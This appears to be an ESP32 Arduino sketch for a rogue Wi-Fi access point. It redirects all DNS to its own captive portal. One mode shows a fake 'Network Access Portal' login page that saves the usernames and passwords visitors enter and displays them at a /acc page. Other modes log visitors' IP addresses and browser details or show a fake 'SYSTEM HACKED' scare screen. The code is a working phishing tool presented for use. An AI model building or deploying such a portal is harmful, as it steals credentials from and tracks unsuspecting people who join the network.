#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include <vector>

const byte DNS_PORT = 53;
DNSServer dnsServer;
WebServer server(80);
Preferences prefs;

String apSSID = "SSID";
String apPassword = "";
int selectedSite = 1;

const uint8_t audio_mp3[] PROGMEM = {}; // convert mp3 to byte array
const unsigned int audio_mp3_len = sizeof(audio_mp3);

struct ClickInfo {
  String ip;
  String userAgent;
  String button;
  String time;
};
std::vector<ClickInfo> clickLog;

// --- TIME STRING ---
String getTimeString() {
  time_t now = millis() / 1000;
  int sec = now % 60;
  int min = (now / 60) % 60;
  int hr  = (now / 3600) % 24;
  char buf[20];
  sprintf(buf, "%02d:%02d:%02d", hr, min, sec);
  return String(buf);
}

// --- ACCESS POINT ---
void startAccessPoint() {
  if (apPassword.length() >= 8)
    WiFi.softAP(apSSID.c_str(), apPassword.c_str());
  else
    WiFi.softAP(apSSID.c_str());

  Serial.println("AP started: " + apSSID);
  Serial.println(WiFi.softAPIP());
}

// --- SITE 1 (AUDIO PAGE) ---
void handleAudioSite() {
  String html = R"=====(<!DOCTYPE html><html><head><meta charset='UTF-8'><title>WiFi</title>
  <style>
  body{display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;margin:0;background:linear-gradient(135deg,#0066cc,#0099ff);font-family:Arial;color:white;text-align:center;}
  h1{font-size:2.5em;margin-bottom:0.5em;}
  p{font-size:1.8em;margin-bottom:1.5em;}
  button{padding:1.5em 3em;font-size:2em;border:none;border-radius:15px;background:#ff6600;color:white;cursor:pointer;margin:1em;box-shadow:0 8px 16px rgba(0,0,0,0.3);transition:all 0.3s ease;}
  button:hover{background:#ff8533;transform:scale(1.05);box-shadow:0 12px 20px rgba(0,0,0,0.4);}
  #volumeMessage{display:none;position:fixed;top:20%;left:50%;transform:translate(-50%,-20%);background:white;color:#333;padding:2.5em;border-radius:15px;font-size:1.5em;box-shadow:0 10px 25px rgba(0,0,0,0.3);}
  </style></head><body>
  <h1>WIFI</h1>
  <p>Connect to WiFi</p>
  <button onclick="sendClick('connect')">Connect</button>
  <button onclick="sendClick('back')">Back</button>
  <audio id="myAudio" src="/audio"></audio>
  <div id="volumeMessage">🔊 Turn up the volume 🔊</div>
  <script>
  function sendClick(type){
    fetch('/track?btn='+type);
    document.getElementById('myAudio').play();
    document.getElementById('volumeMessage').style.display='block';
    setTimeout(()=>document.getElementById('volumeMessage').style.display='none',4000);
  }
  </script></body></html>)=====";

  server.send(200,"text/html",html);
}

// --- SITE 2 (LOGIN PAGE - SAVES CREDENTIALS) ---
void handleLoginSite() {
  String html = R"=====(<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Network Login</title>
  <style>
  body{font-family:Arial;background:#f0f0f0;margin:0;padding:2em;}
  .box{background:white;padding:2em;border-radius:10px;max-width:400px;margin:auto;}
  input{width:100%;padding:10px;margin:10px 0;}
  button{padding:10px;width:100%;}
  </style>
  </head><body>
  <div class="box">
  <h2>Network Access Portal</h2>
  <p>Enter your account credentials to access the network</p>

  <form method='POST' action='/login'>
  <label>Username</label>
  <input type='text' name='user' placeholder='enter username' required>

  <label>Password</label>
  <input type='password' name='pass' placeholder='enter password' required>

  <button type='submit'>LOGIN</button>
  </form>

  <p><a href='/acc'>View saved credentials</a></p>
  </div>
  </body></html>)=====";

  server.send(200,"text/html",html);
}

// --- SITE 3 ---
void handlePrankSite() {
  String html = R"=====(<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Hacked</title>
  <style>body{background:black;color:red;font-family:Courier;text-align:center;padding-top:10em;}
  h1{font-size:3em;animation:blink 1s infinite;}@keyframes blink{50%{opacity:0;}}</style>
  </head><body>
  <h1>⚠️ SYSTEM HACKED ⚠️</h1>
  <p>Your device is being accessed...</p>
  </body></html>)=====";

  server.send(200,"text/html",html);
}

void setup() {

  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  startAccessPoint();

  dnsServer.start(DNS_PORT,"*",WiFi.softAPIP());

  prefs.begin("settings",false);
  selectedSite = prefs.getInt("site",1);

  server.on("/",HTTP_GET,[](){
    if(selectedSite==1) handleAudioSite();
    else if(selectedSite==2) handleLoginSite();
    else handlePrankSite();
  });

  // save login
  server.on("/login",HTTP_POST,[](){

    String user = server.arg("user");
    String pass = server.arg("pass");

    String all = prefs.getString("accounts","");
    String record = getTimeString()+" | "+user+" | "+pass+"\n";

    all += record;
    prefs.putString("accounts",all);

    server.send(200,"text/html",
    "<h2>Saved successfully</h2><a href='/acc'>View credentials</a>");
  });

  // show saved logins
  server.on("/acc",HTTP_GET,[](){

    String all = prefs.getString("accounts","No data");

    String html = "<h2>Saved credentials</h2><pre>"+all+"</pre><a href='/'>Back</a>";

    server.send(200,"text/html",html);
  });

  // track clicks
  server.on("/track",HTTP_GET,[](){

    String btn = server.arg("btn");
    String ua = server.header("User-Agent");
    String ip = server.client().remoteIP().toString();

    clickLog.push_back({ip,ua,btn,getTimeString()});

    server.send(200,"text/plain","OK");
  });

  // audio
  server.on("/audio",HTTP_GET,[](){
    server.sendHeader("Content-Type","audio/mpeg");
    server.send_P(200,"audio/mpeg",(const char*)audio_mp3,audio_mp3_len);
  });

  // settings
  server.on("/settings",HTTP_GET,[](){

    String html =
    "<h1>WiFi Settings</h1>"
    "<form method='POST'>"
    "SSID:<input name='ssid'><br>"
    "Password:<input name='pass'><br>"
    "<select name='site'>"
    "<option value='1'>Site 1 (Audio)</option>"
    "<option value='2'>Site 2 (Login)</option>"
    "<option value='3'>Site 3 (Prank)</option>"
    "</select><br>"
    "<input type='submit' value='Save'>"
    "</form>";

    server.send(200,"text/html",html);
  });

  server.onNotFound([](){
    server.sendHeader("Location","/");
    server.send(302,"text/plain","");
  });

  server.begin();
}

void loop(){
  dnsServer.processNextRequest();
  server.handleClient();
}
